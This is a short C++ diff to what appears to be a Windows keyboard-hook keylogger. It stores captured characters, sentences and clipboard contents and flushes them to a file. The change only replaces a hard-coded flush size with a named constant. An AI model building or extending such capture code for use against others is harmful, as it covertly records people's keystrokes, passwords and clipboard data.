@@ -1,6 +1,10 @@
 #include "hookProc.h"
 
-//std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
+//this is where you will define the vector size for the saved characters before flushing.
+//recommended size <= 1,000, since we don't want a string that's over ~2k characters.
+constexpr int STRING_VECTOR_MAX_SIZE = 200;
+
+
 std::vector<int> savedChars = {};
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
 std::vector<std::string> clipboardVector = {};
@@ -55,7 +59,7 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 		}
 #else
 
-		flushChars(savedChars, pathString, error_count, true, 500);
+		flushChars(savedChars, pathString, error_count, true, STRING_VECTOR_MAX_SIZE);
 		std::cout << savedChars.size() << '\n';
 
 #endif
